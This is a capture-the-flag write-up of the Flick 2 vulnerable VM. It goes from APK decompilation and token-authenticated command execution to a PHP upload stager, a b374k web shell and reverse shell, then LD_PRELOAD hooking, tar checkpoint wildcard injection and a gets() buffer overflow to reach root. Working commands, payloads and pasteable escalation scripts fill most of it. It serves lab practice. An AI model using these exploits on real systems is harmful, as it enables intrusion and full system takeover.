[@Leonjza](https://twitter.com/leonjza) released Flick 2, a vulnerable VM with 'a mobile twist', last week. You are reading my writeup.

## Recon
As is usual with these boot2roots, let us first activate nmap to see what we are dealing with:

>```bash
>$ nmap -sT -A -T4 192.168.56.101 -p-
>Nmap scan report for 192.168.56.101
>Host is up (0.00079s latency).
>Not shown: 65533 filtered ports
>PORT    STATE  SERVICE VERSION
>80/tcp  closed http
>443/tcp open   http    nginx 1.6.3
>|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
>|_http-title: 400 The plain HTTP request was sent to HTTPS port
>| ssl-cert: Subject: commonName=flick.local/organizationName=Flick/stateOrProvinceName=North South/countryName=ZA
>| Not valid before: 2015-06-23T13:43:54+00:00
>|_Not valid after:  2024-09-08T13:43:54+00:00
>|_ssl-date: 2015-08-25T17:30:21+00:00; +2h00m00s from local time.
>| tls-nextprotoneg: 
>|_  http/1.1
>```

A quick look at the webserver running on port 443 did not reveal anything interesting, so lets look at the bundeled .apk file.

The mobile twist here consists of a .apk file which we can look at in a virtual machine. After looking a bit I decompiled it and found some interesting code:

>```java
>    protected transient String doInBackground(String as[])
>    {
>        Object obj = as[0];
>        as = as[1];
>        String s = "";
>        byte abyte0[];
>        int i;
>        try
>        {
>            obj = (HttpsURLConnection)(new URL(((String) (obj)))).openConnection();
>            Object obj1 = new PubKeyManager();
>            ((HttpsURLConnection) (obj)).setHostnameVerifier(new HostnameVerifier() {
>
>                final DoRegisterActivity.CallAPI this$1;
>
>                public boolean verify(String s1, SSLSession sslsession)
>                {
>                    return true;
>                }
>
>            
>            {
>                this$1 = DoRegisterActivity.CallAPI.this;
>                super();
>            }
>            });
>            SSLContext sslcontext = SSLContext.getInstance("TLS");
>            sslcontext.init(null, new TrustManager[] {
>                obj1
>            }, null);
>            ((HttpsURLConnection) (obj)).setSSLSocketFactory(sslcontext.getSocketFactory());
>            ((HttpsURLConnection) (obj)).setConnectTimeout(5000);
>            ((HttpsURLConnection) (obj)).setRequestMethod("POST");
>            ((HttpsURLConnection) (obj)).setRequestProperty("Content-Type", "application/json; charset=UTF-8");
>            obj1 = new JSONObject();
>            ((JSONObject) (obj1)).put("uuid", as);
>            as = new DataOutputStream(((HttpsURLConnection) (obj)).getOutputStream());
>            as.write(((JSONObject) (obj1)).toString().getBytes());
>            as.flush();
>            as.close();
>            obj = new BufferedInputStream(((HttpsURLConnection) (obj)).getInputStream());
>            abyte0 = new byte[1024];
>        }
>```

This reveals the app registers itself first with the server using a JSON POST request to obtain a token.

When it is registered the following two code blocks are of importance:

>```java
>public void doCmd(View view)
>    {
>        Toast.makeText(this, (new StringBuilder()).append("Running command: ").append(view.getTag().toString()).toString(), 0).show();
>        view = Base64.encodeToString(view.getTag().toString().getBytes(), 0);
>        Object obj = (TelephonyManager)getBaseContext().getSystemService("phone");
>        String s = (new StringBuilder()).append("").append(((TelephonyManager) (obj)).getDeviceId()).toString();
>        obj = (new StringBuilder()).append("").append(((TelephonyManager) (obj)).getSimSerialNumber()).toString();
>        s = (new UUID((new StringBuilder()).append("").append(android.provider.Settings.Secure.getString(getContentResolver(), "android_id")).toString().hashCode(), (long)s.hashCode() << 32 | (long)((String) (obj)).hashCode())).toString();
>        Object obj1 = getSharedPreferences(getString(0x7f060012), 0);
>        obj = ((SharedPreferences) (obj1)).getString("api_server", null);
>        obj1 = ((SharedPreferences) (obj1)).getString("api_auth_token", null);
>        (new CallAPI()).execute(new String[] {
>            (new StringBuilder()).append("https://").append(((String) (obj))).append("/do/cmd/").append(view).toString(), s, obj1
>        });
>    }
>```

>```java
>        ((HttpsURLConnection) (obj1)).setSSLSocketFactory(sslcontext.getSocketFactory());
>        ((HttpsURLConnection) (obj1)).setConnectTimeout(5000);
>        ((HttpsURLConnection) (obj1)).setRequestProperty("Content-Type", "application/json; charset=UTF-8");
>        ((HttpsURLConnection) (obj1)).setRequestProperty("X-UUID", ((String) (obj)));
>        ((HttpsURLConnection) (obj1)).setRequestProperty("X-Token", as);
>        obj = new BufferedInputStream(((HttpsURLConnection) (obj1)).getInputStream());
>```

So when registered it includes the token and uuid in the headers and then makes a get request to http://*server*/do/cmd/*command*, to get the output of a command

We can recreate this process in Burp by crafting the right packets:

Request:

>```
>POST /register/new HTTP/1.1
>Host: 192.168.56.101
>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: en-US,en;q=0.5
>Accept-Encoding: gzip, deflate
>Content-Type: application/json; charset=UTF-8
>Connection: keep-alive
>Cache-Control: max-age=0
>Content-Length: 14
>
>{"uuid":"dqi"}
>```

Response:

>```json
>{"registered":"ok","message":"The requested UUID is now registered.","token":"Twqnain9PyjcXQZSNKK2ZlhQRy13OfnJ"}
>```

Now that we have a token and uuid we have command execution on the server:

Request:

>```
>GET /do/cmd/id HTTP/1.1
>Host: 192.168.56.101
>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: en-US,en;q=0.5
>Accept-Encoding: gzip, deflate
>X-UUID: dqi
>X-Token: Twqnain9PyjcXQZSNKK2ZlhQRy13OfnJ
>Connection: keep-alive
>```

Reponse:

>```
>{"status":"error","output":"sh: $'\\211': command not found\n"}
>```

Turns out the command is also base64 encoded; moving on to curl for convenience:

>```bash
>root@kali:~# curl -s -k  -X 'GET' -H 'X-UUID: dqi' -H 'X-Token: Twqnain9PyjcXQZSNKK2ZlhQRy13OfnJ' https://192.168.56.101/do/cmd/$(base64 <<< id)
>{"status":"ok","command":"id\n","output":"uid=998(nginx) gid=997(nginx) groups=997(nginx)\n"}
>```

There is some filtering on the commands but the directory we are in is writable:

>```
>{"status":"ok","command":"pwd\n","output":"\/usr\/share\/nginx\/serverchecker\/public\n"}
>```

printf is not filtered, we can use it to drop a stager:

>```
>printf '<?php error_reporting(E_ALL); ini_set("display_errors", 1); $fp = fopen($_POST["name"], "wb"); fwrite($fp, base64_decode($_POST["content"])); fclose($fp);?>' > ./stager.php
>```

>```
>curl -s -k  -X 'GET' -H 'X-UUID: dqi' -H 'X-Token: Twqnain9PyjcXQZSNKK2ZlhQRy13OfnJ' https://192.168.56.101/do/cmd/cHJpbnRmICc8P3BocCBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOyBpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIDEpOyAkZnAgPSBmb3BlbigkX1BPU1RbIm5hbWUiXSwgIndiIik7IGZ3cml0ZSgkZnAsIGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjb250ZW50Il0pKTsgZmNsb3NlKCRmcCk7Pz4nID4gLi9zdGFnZXIucGhw
>```

Use the following python script do drop b374k.php:

>```python
>import requests
>import base64
>s = requests.session()
>target = "https://192.168.56.101:443/stager.php"
>f = open('b374k.php')
>payload = {
>        "name": "b374k.php",
>        "content": base64.b64encode("\n".join(f.readlines()))
>}
>r = s.post(target, data=payload, verify=False)
>```

We can do some enumeration with b374k, finding suid binaries in /usr/local/bin, afterwards it can spawn us a reverse shell.

>```bash
>$ nc -l -v -p 13123
>Listening on [0.0.0.0] (family 0, port 13123)
>Connection from [192.168.56.101] port 13123 [tcp/*] accepted (family 2, sport 53996)
>b374k shell : connected
>sh: no job control in this shell
>/usr/share/nginx/serverchecker/public>id
>id
>uid=998(nginx) gid=997(nginx) groups=997(nginx)
>```

There are SSH credentials included in the .apk file.

>```java
>public CommandActivity()
>    {
>        integrity_check = "YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==";
>    }
>    private static String validate(String s)
>    {
>        char ac[] = new char[31];
>        char[] _tmp = ac;
>        ac[0] = 'T';
>        ac[1] = 'h';
>        ac[2] = 'i';
>        ac[3] = 's';
>        ac[4] = ' ';
>        ac[5] = 'i';
>        ac[6] = 's';
>        ac[7] = ' ';
>        ac[8] = 'a';
>        ac[9] = ' ';
>        ac[10] = 's';
>        ac[11] = 'u';
>        ac[12] = 'p';
>        ac[13] = 'e';
>        ac[14] = 'r';
>        ac[15] = ' ';
>        ac[16] = 's';
>        ac[17] = 'e';
>        ac[18] = 'c';
>        ac[19] = 'r';
>        ac[20] = 'e';
>        ac[21] = 't';
>        ac[22] = ' ';
>        ac[23] = 'm';
>        ac[24] = 'e';
>        ac[25] = 's';
>        ac[26] = 's';
>        ac[27] = 'a';
>        ac[28] = 'g';
>        ac[29] = 'e';
>        ac[30] = '!';
>        StringBuilder stringbuilder = new StringBuilder();
>        for (int i = 0; i < s.length(); i++)
>        {
>            stringbuilder.append((char)(s.charAt(i) ^ ac[i % ac.length]));
>        }
>        return stringbuilder.toString();
>```

All it does to protect robins password is XOR the base64 decoded integrity_check with "This is a super secret message!"

Recreate in python:

>```python
>#!/usr/bin/python
>xorstring1 = "YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==".decode('base64')
>xorstring2 = "This is a super secret message!"
>out = ""
>for i in range(len(xorstring1)):
>    out += chr(ord(xorstring1[i]) ^ ord(xorstring2[i % len(xorstring2)]))
>print out
>```

Run it:

>```bash
>$ ./robin.py 
>40373df4b7a1f413af61cf7fd06d03a565a51898
>```

SSH is disabled but now that we have robin's password and a shell we can just 'su robin'.

>```bash
>/usr/share/nginx/serverchecker/public>su robin
>su robin
>Password: 40373df4b7a1f413af61cf7fd06d03a565a51898
>id
>uid=1000(robin) gid=1000(robin) groups=1000(robin)
>```

## robin

In robins /home directory we find a debug.gpg file:

>```bash
>cat /home/robin/debug.gpg
>-----BEGIN PGP SIGNED MESSAGE-----
>Hash: SHA1
>
>Dude,
>
>I know you are trying to debug this stupid dice thing, so I figured the below
>will be useful?
>[...]
>__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 <unfinished ...>
>getenv("LD_PRELOAD")                                                                                          = nil
>rand()                                                                                                        = 1804289383
>__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
>__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
>+++ exited (status 0) +++Dice said: 1804289383
>[...]
>```

The sudoers file gives another big hint:

>```bash
>sudo -l
>sudo: sorry, you must have a tty to run sudo
>python -c 'import pty;pty.spawn("/bin/bash")'
>[robin@fII public]$ sudo -l
>[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
>
>Matching Defaults entries for robin on this host:
>    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", env_keep+=LD_PRELOAD,
>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
>
>User robin may run the following commands on this host:
>    (bryan) /usr/local/bin/dice
>```

We can run the dice program as bryan and it keeps the LD_PRELOAD enviroment variable, the getenv call displayed in the strace is bad news, so we will hook it too in our shared library.

>```C
>char *getenv(cont char *name){
>	return 0;
>}
>int rand(){
>	system("/bin/bash");
>	return 4; //guaranteed to be random
>}
>```

Pasteable commands to escalate to bryan:

>```bash
>cd /tmp;
>echo 'char *getenv(const char *name){' > rand.c;
>echo 'return 0;' >> rand.c;
>echo '}' >> rand.c;
>echo 'int rand(){' >> rand.c;
>echo 'system("/bin/bash");' >> rand.c;
>echo 'return 4;' >> rand.c;
>echo '}' >> rand.c;
>gcc -fPIC -c rand.c -o rand.o;
>gcc -shared -o rand.so rand.o;
>cd /usr/local/bin;
>sudo -u bryan LD_PRELOAD=/tmp/rand.so ./dice;
>
>```

You might get path errors for gcc, just use: 

>```
>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
>```

## bryan 

Now that we are bryan we can run the suid binary "backup" as sean. Opening it in IDA reveals the command it runs: 

>```C
>int __cdecl main(int argc, const char **argv, const char **envp)
>{
>  setresuid(1002u, 1002u, 1002u);
>  setresgid(1002u, 1002u, 1002u);
>  puts(" * Securing environment");
>  puts(" * Performing database backup...");
>  system("PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +\"%Y%m%d\").tar.gz *;");
>  return puts(" * Backup done!");
>}
>```

Because of the * in the command we can craft specific filenames that /bin/tar will see as options. 

>```bash
>echo 1 > --checkpoint=1;
>echo 2 > --checkpoint-action=exec=sh\ shell.sh;
>```

This will execute shell.sh, which compiles and chmods a wrapper as sean for us:

>```bash
>#!/bin/sh
>gcc -o /tmp/wrap /tmp/a.c
>chmod ugo+s /tmp/wrap
>/usr/local/bin/backup
>```

First prepare a.c:

>```C
>int main(void){
>	setresuid(1002, 1002, 1002);
>	system("/bin/bash");
>	}
>```

To paste in a terminal:

>```
>cd /usr/share/nginx/serverchecker/storage;
>echo 1 > --checkpoint=1;
>echo 2 > --checkpoint-action=exec=sh\ shell.sh;
>echo '#!/bin/sh' > shell.sh;
>echo 'gcc -o /tmp/wrap /tmp/a.c'>> shell.sh; 
>echo 'chmod ugo+s /tmp/wrap' >> shell.sh;
>cd /tmp;
>echo 'int main(void){' > a.c;
>echo 'setresuid(1002, 1002, 1002);' >> a.c;
>echo 'system("/bin/bash");' >> a.c;
>echo '}' >> a.c;
>/usr/local/bin/backup;
>/tmp/wrap;
>newgrp sean;
>```

## sean

There is another suid binary in the same location as the previous ones, we can use it to escalate to root.

>```bash
>$ file restore
>restore: ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f8c768078fb1214a9777e6a6a50fef30061716d7, not stripped
>```

Run the binary, the call to *gets* jumps out as vulnerable:

>```asm
>gdb-peda$ pdisass get_out_path
>Dump of assembler code for function get_out_path:
>   0x0000000000400fe1 <+0>:	push   rbp
>   0x0000000000400fe2 <+1>:	mov    rbp,rsp
>   0x0000000000400fe5 <+4>:	sub    rsp,0x40
>   0x0000000000400fe9 <+8>:	mov    edi,0x492b77
>   0x0000000000400fee <+13>:	mov    eax,0x0
>   0x0000000000400ff3 <+18>:	call   0x402130 <printf>
>   0x0000000000400ff8 <+23>:	lea    rax,[rbp-0x40]
>   0x0000000000400ffc <+27>:	mov    rdi,rax
>   0x0000000000400fff <+30>:	call   0x402530 <gets>
>   0x0000000000401004 <+35>:	lea    rax,[rbp-0x40]
>   0x0000000000401008 <+39>:	mov    rsi,rax
>   0x000000000040100b <+42>:	mov    edi,0x492b94
>   0x0000000000401010 <+47>:	mov    eax,0x0
>   0x0000000000401015 <+52>:	call   0x402130 <printf>
>   0x000000000040101a <+57>:	lea    rax,[rbp-0x40]
>   0x000000000040101e <+61>:	leave  
>   0x000000000040101f <+62>:	ret    
>```

Checksec to confirm:

>```
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : ENABLED
>PIE       : disabled
>RELRO     : Partial
>```

Should be a simple overflow of the return address, since the binary is staticly linked we can return to libc easily:

Looking for the /bin/sh string I found this function, returning anywhere in it should work:

>```
>.text:0000000000401F17 loc_401F17:                             ; CODE XREF: do_system+147j
>.text:0000000000401F17                 xor     edx, edx
>.text:0000000000401F19                 mov     esi, offset intr
>.text:0000000000401F1E                 mov     edi, 2
>.text:0000000000401F23                 mov     [rsp+188h+var_158], (offset aBinSh_0+5)
>.text:0000000000401F2C                 mov     [rsp+188h+var_150], offset aC_1 ; "-c"
>.text:0000000000401F35                 mov     [rsp+188h+var_148], rbp
>.text:0000000000401F3A                 mov     [rsp+188h+var_140], 0
>.text:0000000000401F43                 call    sigaction
>.text:0000000000401F48                 xor     edx, edx
>.text:0000000000401F4A                 mov     esi, offset quit
>.text:0000000000401F4F                 mov     edi, 3
>.text:0000000000401F54                 call    sigaction
>.text:0000000000401F59                 lea     rsi, [rsp+188h+var_138]
>.text:0000000000401F5E                 xor     edx, edx
>.text:0000000000401F60                 mov     edi, 2
>.text:0000000000401F65                 call    sigprocmask
>.text:0000000000401F6A                 mov     rdx, cs:environ
>.text:0000000000401F71                 lea     rsi, [rsp+188h+var_158]
>.text:0000000000401F76                 mov     edi, offset aBinSh_0 ; "/bin/sh"
>.text:0000000000401F7B                 mov     cs:lock_0, 0
>.text:0000000000401F85                 mov     cs:sa_refcntr, 0
>.text:0000000000401F8F                 call    execve
>.text:0000000000401F94                 mov     edi, 7Fh        ; status
>.text:0000000000401F99                 call    _exit
>```

EIP is @72
>```python
>$ python -c 'print "A"*72 + "\x6a\x1f\x40"'
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj@
>```

pwn time:

>```bash
>bash-4.2$ pwd
>/tmp
>bash-4.2$ touch backup.tar.gz
>bash-4.2$ cd /usr/local/bin
>bash-4.2$ ./restore
>Restore tool v0.1
>Enter the path to the backup.tar.gz: /tmp/
>/tmp/
>Path is: /tmp/
>Enter the output directory: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj^_@
>Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj@
>[root@fII bin]# id
>uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
>[root@fII bin]# 
>```

## root

Grab that flag!

>```
>[root@fII bin]# cat /root/flag
>
>  █████▒██▓     ██▓ ▄████▄   ██ ▄█▀ ██▓ ██▓
>▓██   ▒▓██▒    ▓██▒▒██▀ ▀█   ██▄█▒ ▓██▒▓██▒
>▒████ ░▒██░    ▒██▒▒▓█    ▄ ▓███▄░ ▒██▒▒██▒
>░▓█▒  ░▒██░    ░██░▒▓▓▄ ▄██▒▓██ █▄ ░██░░██░
>░▒█░   ░██████▒░██░▒ ▓███▀ ░▒██▒ █▄░██░░██░
> ▒ ░   ░ ▒░▓  ░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░▓  
> ░     ░ ░ ▒  ░ ▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░ ▒ ░
> ░ ░     ░ ░    ▒ ░░        ░ ░░ ░  ▒ ░ ▒ ░
>           ░  ░ ░  ░ ░      ░  ░    ░   ░  
>                   ░                       
>
> You have successfully completed FlickII!
>
> I hope you learnt as much as I did while
> making it! Any comments/suggestions etc,
> feel free to catch me on freenode in
> #vulnhub or on twitter @leonjza
>```
